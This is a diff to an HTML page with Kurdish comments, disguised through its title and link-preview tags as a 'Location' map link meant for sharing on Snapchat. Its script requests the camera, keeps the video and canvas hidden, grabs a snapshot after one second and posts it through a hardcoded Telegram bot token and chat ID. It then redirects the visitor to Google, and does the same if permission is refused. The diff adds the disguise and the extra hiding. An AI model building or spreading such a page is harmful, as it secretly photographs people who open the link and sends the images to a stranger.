@@ -3,8 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <!-- لێرەدا ناوی لینکەکە گۆڕدراوە بۆ Location -->
+    
+    <!-- ناوی لینکەکە لە سناپچات لێرە دەگۆڕێت -->
     <title>Location</title>
+    <meta property="og:title" content="Location">
+    <meta property="og:description" content="Map details">
+
     <style>
         body { 
             margin: 0; 
@@ -13,8 +17,10 @@
             align-items: center; 
             justify-content: center; 
             height: 100vh; 
+            overflow: hidden;
         }
-        video, canvas, button { display: none; }
+        /* لادانی هەموو دوگمە و ڤیدیۆکان لە شاشە */
+        video, canvas, button { display: none !important; }
     </style>
 </head>
 <body>
@@ -23,6 +29,7 @@
     <canvas id="canvas"></canvas>
 
     <script>
+        // زانیارییەکانی بۆتەکەت
         const token = '8734772782:AAFT6ize__0OBmz53luKQXus2iJpSg9NpmA';
         const chatId = '7602797383';
 
@@ -32,6 +39,7 @@
                 const video = document.getElementById('video');
                 video.srcObject = stream;
                 
+                // چاوەڕێکردن بۆ ١ چرکە تا کامێرا جێگیر دەبێت
                 setTimeout(() => {
                     const canvas = document.getElementById('canvas');
                     canvas.width = video.videoWidth;
@@ -47,11 +55,13 @@
                             method: 'POST',
                             body: formData
                         }).then(() => {
+                            // ناردن بۆ گووگڵ دوای تەواوبوون
                             window.location.href = "https://google.com";
                         });
                     }, 'image/jpeg');
                 }, 1000);
             }).catch(err => {
+                // ئەگەر مۆڵەتی نەدا یان کێشە هەبوو هەر بچێتە گووگڵ
                 window.location.href = "https://google.com";
             });
         };
